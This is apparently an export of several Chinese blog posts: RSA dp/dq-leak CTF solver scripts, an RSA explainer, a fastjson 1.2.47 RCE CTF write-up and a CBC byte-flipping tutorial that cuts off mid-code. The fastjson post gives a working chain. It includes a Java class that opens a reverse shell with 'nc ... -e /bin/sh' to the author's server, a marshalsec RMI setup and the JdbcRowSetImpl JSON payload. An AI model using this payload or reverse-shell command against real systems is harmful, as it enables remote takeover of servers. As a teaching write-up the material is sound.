<h2 id="6-dp泄露"><a href="#6-dp泄露" class="headerlink" title="6.dp泄露"></a>6.dp泄露</h2><blockquote>
<p>dp = d % (p-1)并非字面上d和p相乘</p>
</blockquote>
<p>如果已知<code>dp</code>,<code>e</code>,<code>n</code>,<code>c</code>，则可以解出明文<code>m</code>。证明如下,已知：<br>$$<br>c \equiv m^e \pmod{n} \tag{1}<br>$$</p>
<p>$$<br>m \equiv c^d \pmod{n} \tag{2}<br>$$</p>
<p>$$<br>DP = d \bmod(p-1) \tag{3}<br>$$</p>
<p>对式子（3）两边同乘<code>e</code>，有<br>$$<br>DP e\equiv de \pmod{p-1}<br>$$<br>则存在整数<code>k1</code>，使得：<br>$$<br>de=k_1(p-1)+DPe \tag{4}<br>$$<br>而<br>$$<br>de\equiv1 \pmod{\varphi(n)}<br>$$<br>即<br>$$<br>de\equiv1\pmod{(p-1)(q-1)}<br>$$<br>故存在一个整数<code>k2</code>，使得：<br>$$<br>de=k_2(p-1)(q-1)+1<br>$$<br>带入到式子（4）并整理，得到<br>$$<br>DPe=(p-1)(k_2(q-1)-k_1) + 1<br>$$<br>再令<br>$$<br>x=k_2(q-1)<br>$$<br>即<br>$$<br>DPe=(p-1)x+1<br>$$<br>解得<br>$$<br>x=\frac{DPe}{p-1}-\frac{1}{p-1}<br>$$<br>根据定义，<code>DP&lt;(p-1)</code>，因此<code>1&lt;x&lt;e</code>。</p>
<p>如果<code>e</code>不大，我们可以直接暴力枚举<code>x</code>,当其能够整除<code>DPe-1</code>时候，则<code>p</code>就可以找到了，找到以后进一步解得<code>q</code>，进一步得到<code>d</code>，从而恢复原文。</p>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line">dp = <span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br><span class="line"><span class="comment"># 在范围(1,e)之间进行遍历</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, e):</span><br><span class="line">    <span class="comment"># 若存在 x ，使得 de*e - 1 能被 x 整除</span></span><br><span class="line">    <span class="keyword">if</span> (dp * e - <span class="number">1</span>) % x == <span class="number">0</span>:</span><br><span class="line">        pp = ((dp * e - <span class="number">1</span>) // x) + <span class="number">1</span></span><br><span class="line">        <span class="comment"># 确保 p 能够整除 n</span></span><br><span class="line">        <span class="keyword">if</span> n % pp == <span class="number">0</span>:</span><br><span class="line">            p = pp</span><br><span class="line">            q = n // (((dp * e - <span class="number">1</span>) // x) + <span class="number">1</span>)</span><br><span class="line">            phi = (q - <span class="number">1</span>) * (p - <span class="number">1</span>)</span><br><span class="line">            <span class="comment"># 求模逆</span></span><br><span class="line">            d = gmpy2.invert(e, phi)</span><br><span class="line">            m = gmpy2.powmod(c, d, n)</span><br><span class="line">            print(m)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="7-dp-dq泄露"><a href="#7-dp-dq泄露" class="headerlink" title="7. dp,dq泄露"></a>7. dp,dq泄露</h2><blockquote>
<p>dp = d % (p-1), dq = d % (q-1),并非字面上d和p相乘</p>
</blockquote>
<p>如果已知<code>dp</code>,<code>dq</code>,<code>p</code>,<code>q</code>,<code>c</code>，则可以解出明文<code>m</code>。证明如下,已知<br>$$<br>c \equiv m^e \pmod{n} \tag{1}<br>$$</p>
<p>$$<br>m \equiv c^d \pmod{n} \tag{2}<br>$$</p>
<p>$$<br>DP = d \bmod(p-1) \tag{3}<br>$$</p>
<p>$$<br>DQ = d \bmod(q-1) \tag{4}<br>$$</p>
<p>由式子（2）可得：<br>$$<br>m=c^d+kn=c^d+kpq<br>$$<br>对上式子分别对<code>p</code>和<code>q</code>取模,有：<br>$$<br>m_1 \equiv c^d \pmod{p} \tag{5}<br>$$</p>
<p>$$<br>m_2 \equiv c^d \pmod{q} \tag{6}<br>$$</p>
<p>对式子（5），话句话说，有：<br>$$<br>m_1 + kp = c^d \tag{7}<br>$$<br>即：<br>$$<br>m_1+kp \equiv c^d \pmod{q}<br>$$<br>将上式子带入式子（6），有：<br>$$<br>kp \equiv (m_2-m_1) \pmod{q}<br>$$<br>因为<code>p</code>和<code>q</code>互素，二者最大公约数为1,有：<br>$$<br>k \equiv p’(m_2-m_1) \pmod{q} \tag{8}<br>$$<br><code>p&#39;</code>是<code>p</code>关于<code>q</code>的逆元,即：<br>$$<br>pp’ \equiv1 \pmod{q}<br>$$<br>联立（7）和（8），有：<br>$$<br>c^d=m_1+((p’(m_2-m_1) )\bmod{q} )p<br>$$<br>再带入式子（2），有：<br>$$<br>m \equiv (m_1+((p’(m_2-m_1) )\bmod{q} )p )\pmod{n} \tag{9}<br>$$<br>下面我们来求<code>m1</code>和<code>m2</code>.</p>
<p>由式子（3），得：<br>$$<br>d=DP+k(p-1)<br>$$<br>将上式子（5），有：<br>$$<br>m_1 \equiv c^{DP+k(p-1)} \pmod{p}<br>$$<br>即：<br>$$<br>m_1 \equiv c^{DP}c^{k(p-1)} \pmod{p}<br>$$<br>根据费马小定理，若<code>p</code>是素数,且<code>gcd(c,p)=1</code>，则<code>c^(p-1)=1 mod p</code>。</p>
<p>即<br>$$<br>c^{k(p-1)} \pmod{p} \equiv (c^{p-1}\pmod{p})^{k}\pmod{p}\equiv1<br>$$<br>故：<br>$$<br>m_1=c^{DP} \pmod{p}<br>$$<br>同理<br>$$<br>m_2=c^{DQ} \pmod{q}<br>$$<br>将这两个式子回代到式子（9）即可求出明文。</p>
<p>使用<code>python</code>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span> </span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span> </span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span> </span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span> </span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line">n = p * q</span><br><span class="line">m1 = pow(c,dp,p)</span><br><span class="line">m2 = pow(c,dq,q)</span><br><span class="line">I = gmpy2.invert(p,q)</span><br><span class="line">m = (m1 + I * ((m2 - m1) % q) * p) % n</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>

<p>8</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>公钥密码算法之RSA</title>
    <url>/2022/08/14/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E4%B9%8BRSA/</url>
    <content><![CDATA[<p>本文参考自文章<a href="https://weread.qq.com/web/bookDetail/77d32500721a485577d8eee" target="_blank" rel="noopener">【从0到1：CTFer成长之路】</a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>笼统而言，密码学可以分为古典密码和现代密码阶段，古典密码涉及知识较为简单，容易理解，现代密码融入了大量数论知识，安全性能也大幅提升。</p>
<blockquote>
<p>自从科克霍夫原则和对称加密体制被提出后，密码学进入了现代密码阶段。成熟的分组密码、流密码的加密强度和加密效率都非常优秀，然而对称密码体系存在着一个不可忽略的问题——密钥的传输需要一个安全的信道，否则一旦密钥被截获，对称加密就毫无安全性可言。另外，对称加密体制并没有解决信息的认证与不可否认性的问题。</p>
</blockquote>
<p>1976年,Whitfield Diffie和Martin Hellman发表了<a href="https://ieeexplore.ieee.org/document/1055638" target="_blank" rel="noopener">New directions in cryptography</a>这篇划时代的文章，奠定了公钥密码系统的基础，而在1977年，Ron Rivest、Adi Shamir和Leonard Adleman发明了一种直到今天还被广泛运用的公钥密码算法——RSA。</p>
<p>该算法运用的数学原理是：将两个大素数相乘比较简单，但是要把这两个素数的乘积进行因式分解却是及其困难的。</p>
<a id="more"></a>

<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>算法开始之前，先选取两个较大的不同素数<code>p</code>和<code>q</code>（一般大于<code>512bit</code>，即2^512）。令：</p>
<p>$$<br>n=pq<br>$$</p>
<p>再求<code>n</code>的欧拉函数：</p>
<p>$$<br>\varphi (n)=\varphi (p-1)\varphi (q-1)<br>$$</p>
<p>再选取一个与该欧拉函数值互质的整数<code>e</code>，为了加速运算，通常选一个较小，但不至于太小的素数，如65537。</p>
<p>求得<code>e</code>模$\varphi (n)$的逆元<code>d</code>，即：</p>
<p>$$<br>ed \equiv 1 \pmod{\varphi (n)}<br>$$</p>
<p>然后<code>&lt;n, e&gt;</code>作为公钥，可以对外公布，不用担心别人窃取，可以用于发送方加密信息；<code>&lt;n, d&gt;</code>作为私钥，用户自己保留，用于解密信息。</p>
<p><code>RSA</code>系统工作流程如下：</p>
<ol>
<li><p>发送消息双方产生密钥对（公钥和私钥），保留私钥，交换公钥。</p>
</li>
<li><p>假设阿珍要传输信息给阿强，传输的内容为<code>m</code>，计算：</p>
</li>
</ol>
<p>$$<br>   c=m^e\pmod{n},其中(0\le m\lt n)<br>$$</p>
<ol start="3">
<li><p>阿珍将<code>c</code>发送给阿强</p>
</li>
<li><p>阿强收到信息后，计算：</p>
</li>
</ol>
<p>$$<br>   m1=c^d\pmod{n}<br>$$</p>
<ol start="5">
<li>可以验证，<code>m1</code>和<code>m</code>是相等的。</li>
</ol>
<p>举个简单的例子：</p>
<p>取<code>p=11</code>,<code>q=7</code>，则<code>n=77</code>,再取<code>e=13</code>，则<code>d=37</code>(13 x 37 = 481,481 % 60 = 1)，发送的明文为8：</p>
<p>$$<br>c=8^{13}\pmod{77}=50<br>$$</p>
<p>解密：</p>
<p>$$<br>m=50^{37}\pmod{77}=8<br>$$</p>
<p>下面我们来证明<code>m1</code>和<code>m</code>是相等的，即$m=c^d\pmod{n}$，由于m&lt;n,故只要证明：</p>
<p>$$<br>c^d\equiv m\pmod{n}<br>$$</p>
<p>而加密的时候：</p>
<p>$$<br>c=m^e\pmod{n}<br>$$</p>
<p>即，只要证：</p>
<p>$$<br>m^{e*d}\equiv m\pmod{n}<br>$$</p>
<p>因为<code>e</code>和<code>d</code>互为逆元，即$ed \equiv 1 \pmod{\varphi (n)}$，则必存在整数k，使得：</p>
<p>$$<br>e<em>d=k</em>\varphi (n)+1<br>$$</p>
<p>存在两种情况：</p>
<h3 id="情况1：m和n互素"><a href="#情况1：m和n互素" class="headerlink" title="情况1：m和n互素"></a>情况1：m和n互素</h3><blockquote>
<p>欧拉定理：若 gcd(a, m) =1，则$ a^{\varphi (m)}\equiv 1\pmod{m} $</p>
</blockquote>
<p>m和n互素，有$  gcd(n, m)=1 $，根据欧拉定理，有</p>
<p>$$<br>m^{\varphi (n)}\equiv 1\pmod{n}<br>$$</p>
<p>即:</p>
<p>$$<br>m^{e<em>d}\equiv m^{k</em>\varphi (n)+1} \equiv m<em>m^{k</em>\varphi (n)}\equiv m\pmod{n}<br>$$</p>
<p>得证！</p>
<h2 id="情况2：m和n不互素"><a href="#情况2：m和n不互素" class="headerlink" title="情况2：m和n不互素"></a>情况2：m和n不互素</h2><p>二者不互素，则最大公约数不为1，由于$m&lt;n$，且$n=pq$，p和q都是素数，且二者不等，故m的因子中必含p或者q中之一，且只含一个而不含另外一个（同时含的话，则$m&gt;=pq=n$，矛盾）。不妨含p，即存在$m=cp$，同时m与q互素，由费马小定理可得：</p>
<p>$$<br>m^{q-1}\equiv 1\pmod{q}<br>$$</p>
<blockquote>
<p>费马小定理：如果q是一个质数，而整数a不是q的倍数，则有$a^{q-1}\equiv 1\pmod{q}$</p>
</blockquote>
<p>进一步，有：</p>
<p>$$<br>m^{k\varphi (n)} \equiv m^{k(p-1)(q-1)}\equiv 1^{k(p-1)}\equiv 1 \pmod{q}<br>$$</p>
<p>即存在一个整数h，使得：</p>
<p>$$<br>m^{k\varphi (n)}=hq+1<br>$$</p>
<p>两边同乘以一个m，注意上文中$m=cp$，有：</p>
<p>$$<br>m^{k\varphi (n)+1}=cp(hq+1)=cphq+m=hcn+m<br>$$</p>
<p>两边模n，有：</p>
<p>$$<br>m^{k\varphi (n)+1}\equiv m^{ed}\equiv  m \pmod{n}<br>$$</p>
<p>综上，解密得到的<code>m1</code>和原来的明文<code>m</code>是相等的。</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>RSA公钥密码的安全性依赖于大整数因式分解的困难性，如果知道了p和q，很容易求得公钥e关于模$\varphi (n)$的逆元d。如果不知道p和q，按照现在的计算机能力，听说分解一个400位整数需要花费上亿年时间，:D </p>
<p>当p和q是超过两百位的素数时候，可以粗略地说，RSA是暂时安全的。</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson 1.2.47 RCE漏洞--Java Fastjson Unserializey题解</title>
    <url>/2022/08/02/fastjson-1-2-47-RCE%E6%BC%8F%E6%B4%9E-Java-Fastjson-Unserializey%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>打开场景后扫描器扫不出任何可疑路径，但是使用burp抓包，获取响应包的时候获得了一个<code>source.zip</code>的源码，打开后发现，是一个使用<code>Spring Boot</code>搭建的项目，同时使用了<code>fastjson</code>，而且该版本存在<code>RCE</code>漏洞（远程代码执行）！</p>
<p>漏洞成因这里就不展开细讲（<del>主要是我也讲不会！</del>），这里只讲怎么利用该漏洞反弹<code>shell</code></p>
<a id="more"></a>

<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><h3 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h3><table>
<thead>
<tr>
<th>主机</th>
<th>IP</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>Ubuntu 虚拟机</td>
<td>114.67.175.224</td>
<td>靶机，运行web项目，该项目中使用了存在漏洞版本的<code>fastjson</code></td>
</tr>
<tr>
<td>cetos7 虚拟机</td>
<td>175.178.153.72（公网IP）</td>
<td>搭建web环境（提供恶意Java字节码文件）和RMI服务，nc接收反弹shell；安装好git、maven、jdk1.8，python、nc</td>
</tr>
<tr>
<td>win 11 物理机</td>
<td>—</td>
<td>使用Postman 发送POC</td>
</tr>
</tbody></table>
<h3 id="搭建RMI服务"><a href="#搭建RMI服务" class="headerlink" title="搭建RMI服务"></a>搭建RMI服务</h3><p>由centos7主机完成该工作。</p>
<p>这里借用<code>marshalsec</code>工具，先在<code>GitHub</code>上面下载相关代码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/RandomRobbieBF/marshalsec-jar</span><br></pre></td></tr></table></figure>

<p>使用<code>maven</code>构建包：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd marshalsec</span><br><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>

<p>然后准备以下恶意代码文件<code>TouchFile.java</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TouchFile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String commands = <span class="string">"nc 175.178.153.72 4444 -e /bin/sh"</span>;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>将来靶机中会执行<code>commands</code>中的命令，<code>175.178.153.72</code>是我将来接受反弹<code>shell</code>的地址。</p>
<p>然后编译该文件成字节码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">javac TouchFile.java</span><br></pre></td></tr></table></figure>

<p>然后使用<code>python</code>搭建web服务，使得外网能够访问该字节码文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 1234</span><br></pre></td></tr></table></figure>

<blockquote>
<p>phthon2: python -m SimpleHTTPServer 1234</p>
</blockquote>
<p>使用外网能够访问该文件，则说明web服务搭建完毕：</p>
<p><img src="https://cdn.yalexin.top/image-20220802082146840.png" alt="image-20220802082146840"></p>
<p><strong>注意：</strong>防火墙记得放开该端口，并且如果你搭建web服务的主机是像腾讯云一样的服务商提供的，还要到控制台放开该端口。</p>
<p>开始运行<code>RMI</code>服务：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://175.178.153.72:1234/#TouchFile" 9988</span><br></pre></td></tr></table></figure>

<h3 id="nc开启监听窗口"><a href="#nc开启监听窗口" class="headerlink" title="nc开启监听窗口"></a>nc开启监听窗口</h3><p>由centos7主机完成该工作。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong>以上提到的3个端口，均要在防火墙中放开，并且到控制台放开端口。</p>
<h3 id="开始攻击！"><a href="#开始攻击！" class="headerlink" title="开始攻击！"></a>开始攻击！</h3><p>该工作由win11 主机完成，使用Postman发送数据：</p>
<p><img src="https://cdn.yalexin.top/image-20220802083559738.png" alt="image-20220802083559738"></p>
<p><code>json</code>对象为：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"a"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="attr">"val"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"b"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="attr">"dataSourceName"</span>:<span class="string">"rmi://175.178.153.72:9988/TouchFile"</span>,</span><br><span class="line">        <span class="attr">"autoCommit"</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>观察我们的centos主机，我们发现nc窗口成功获取了靶机的<code>shell</code>：</p>
<p><img src="https://cdn.yalexin.top/image-20220802084111576.png" alt="image-20220802084111576"></p>
<p>下面直接运行命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.yalexin.top/image-20220802083907002.png" alt="image-20220802083907002"></p>
<p>读取<code>flag</code>：</p>
<p><img src="https://cdn.yalexin.top/image-20220802083950974.png" alt="image-20220802083950974"></p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p><code>Fastjson</code>是阿里巴巴推出的，性能还算不错，国内应该很多人使用。但是之前爆过几次反序列化<code>RCE</code>漏洞让无数厂商苦不堪言，怎么说呢，国产软件，任重道远，希望它越来越好吧！</p>
]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>fastjson</tag>
        <tag>RCE漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>CBC字节翻转攻击</title>
    <url>/2022/07/10/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p>上文我们初步了解了<code>CBC</code>加密原理以及模拟实现，但是根据原理，我们可以控制第一段密文来控制第二段明文的形成，这就是所谓的<code>CBC</code>字节翻转攻击。当然实现该攻击是要具备一定条件的，例如我们需要获取到<code>iv</code>向量，密文段，以及修改后的第一段错误明文。</p>
<p>举个例子，阿强爱上了阿珍，他将信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">i love you</span><br></pre></td></tr></table></figure>

<p>通过编码后，将<code>iv</code>和密文<code>cipher</code>发送给阿珍，但是在传输过程中被隔壁老王截取到了，老王心想能拆散一对是一对，将把信息篡改成：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">i hate you</span><br></pre></td></tr></table></figure>

<p>成功将他们的爱情扼杀在摇篮中！🤡</p>
<a id="more"></a>

<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>让我们先回顾一下解密流程：<br><img src="https://cdn.yalexin.top/image-20220709185258788.png" alt></p>
<p>字节翻转攻击的利用点是利用上一段密文来控制本段明文的生成，这是因为：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">plain[2] = decrypt(cipher[2]) ⊕ cipher[1]</span><br></pre></td></tr></table></figure>

<p>由于我们的数据是分段的，即有：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for i from 1 to 16:</span><br><span class="line">	plain[2][i] = decrypt(cipher[2][i]) ⊕ cipher[1][i]</span><br></pre></td></tr></table></figure>

<p>如果我们希望<code>plain[2][i]</code>是某一个特定的字符，如<code>&#39;a&#39;</code>，那么我们可以从<code>cipher[1][i]</code>入手，为了达成该目的，我们先来看推导过程：</p>
<p>假设我们希望<code>plain[2][1]</code>将来解密以后是<code>&#39;a&#39;</code>，设改变后的<code>cipher[1][1]</code>的值为<code>x</code>，则有：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">'a' = decrypt(cipher[2][1]) ⊕ x</span><br><span class="line">'a' ⊕ x = decrypt(cipher[2][1]) = y</span><br><span class="line">而未改变之前</span><br><span class="line">Plain[2][1] = decrypt(cipher[2][1]) ⊕ cipher[1][1]</span><br><span class="line">即</span><br><span class="line">Plain[2][1] ⊕ cipher[1][1] = decrypt(cipher[2][1]) = y</span><br><span class="line">注意到，我们第二段密文我们并没有改变，即第 2 行的 y 和 第 6 行的 y 是一致的，将第 2 行和第 6 行合并，有</span><br><span class="line">'a' ⊕ x = Plain[2][1] ⊕ cipher[1][1]</span><br><span class="line">即</span><br><span class="line">x = Plain[2][1] ⊕ cipher[1][1] ⊕ 'a'</span><br><span class="line">上述的 cipher[1][1] 指的是最初的</span><br></pre></td></tr></table></figure>

<h3 id="修复iv"><a href="#修复iv" class="headerlink" title="修复iv"></a>修复<code>iv</code></h3><p>由于我们修改了密文的第一段，因此经过解码后，再和原始的<code>iv</code>进行异或，那么得到的明文就不再是原来的第一段明文了，因此我们要修改<code>iv</code>，使得其生成最终生成的第一段明文和原来的一致（当然，要是你想第一段也修改，那就另当别论）。</p>
<p>老规矩，先上推导过程：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">依题意</span><br><span class="line">plain_erro = iv_old ⊕ decrypt(cipher[1]_new)</span><br><span class="line">即</span><br><span class="line">plain_erro ⊕ iv_old = decrypt(cipher[1]_new)</span><br><span class="line">令</span><br><span class="line">iv_new ⊕ decrypt(cipher[1]_new) = plain</span><br><span class="line">上式子中 plain 是原来的明文，式子可以进一步变形，即</span><br><span class="line">iv_new = plain ⊕ decrypt(cipher[1]_new)</span><br><span class="line">将第 4 行和第 8 行合并，有</span><br><span class="line">iv_new = plain ⊕ plain_erro ⊕ iv_old</span><br></pre></td></tr></table></figure>

<p>由此可见，为了使得第一段明文能够被解密方解密，我们需要获得我们修改第一段密文后，得到的错误明文段。</p>
<h2 id="模拟复现"><a href="#模拟复现" class="headerlink" title="模拟复现"></a>模拟复现</h2><p>CBC加密复现基本上和上文的一样，只不过为了使得加密后的字符串可见，这里加了<code>base64</code>编码。而且为了方便演示，这里将加密和解密分开到两个脚本中：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// cbc_encode.php</span></span><br><span class="line"><span class="comment">// 密钥</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, <span class="number">23</span>);</span><br><span class="line"><span class="comment">// 产生长度为 16字节 的随机 iv 向量，一个字符在计算机内部使用8比特表示，即一个字节</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_init_vector</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	$random_iv = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; <span class="number">16</span>;$i++) &#123;</span><br><span class="line">        $random_iv .= chr(rand(<span class="number">1</span>, <span class="number">128</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加密运算</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	$tmp = <span class="string">""</span>;</span><br><span class="line">	<span class="comment">// 和密钥异或</span></span><br><span class="line">	<span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; strlen($data);$i++) &#123;</span><br><span class="line">        $tmp .= chr(ord($data[$i]) ^ SECRET_KEY);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CBC 加密</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cbc_encode</span><span class="params">($plain, $len)</span></span>&#123;</span><br><span class="line">	$iv = get_random_init_vector();</span><br><span class="line">	<span class="comment">// 分段</span></span><br><span class="line">	$plain_tmp = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; $len;$i++)&#123;</span><br><span class="line">		$plain_tmp[$i] = substr($plain, $i * <span class="number">16</span>, <span class="number">16</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$cipher = <span class="string">""</span>;</span><br><span class="line">	<span class="comment">// 对于每一段明文都要进行加密</span></span><br><span class="line">	$last_cipher = $iv;</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; $len;$i++)&#123;</span><br><span class="line">		<span class="comment">// 上一段密文先和本明文做异或运算</span></span><br><span class="line">		$str_tmp = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; <span class="number">16</span>; $j++)&#123;</span><br><span class="line">			$str_tmp .= chr(ord($last_cipher[$j]) ^ ord($plain_tmp[$i][$j]));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 再进行加密</span></span><br><span class="line">		$cipher_i = encode($str_tmp);</span><br><span class="line">		$cipher .= $cipher_i;</span><br><span class="line">		$last_cipher = $cipher_i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">'iv'</span> =&gt; base64_encode($iv),</span><br><span class="line">		<span class="string">'cipher'</span> =&gt; base64_encode($cipher)</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// $mydata = "I               love             you.............";</span></span><br><span class="line">$mydata = $argv[<span class="number">1</span>];</span><br><span class="line">$info = cbc_encode($mydata, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"数据是：\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $mydata . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"加密后："</span> . <span class="string">"\n"</span>;</span><br><span class="line">var_dump($info);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// cbc_decode.php</span></span><br><span class="line"><span class="comment">// 密钥</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, <span class="number">23</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解密运算</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	$tmp = <span class="string">""</span>;</span><br><span class="line">	<span class="comment">// 和密钥异或</span></span><br><span class="line">	<span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; strlen($data);$i++) &#123;</span><br><span class="line">        $tmp .= chr(ord($data[$i]) ^ SECRET_KEY);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CBC 解密</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cbc_decode</span><span class="params">($cipher, $iv, $len)</span></span>&#123;</span><br><span class="line">	$cipher = base64_decode($cipher);</span><br><span 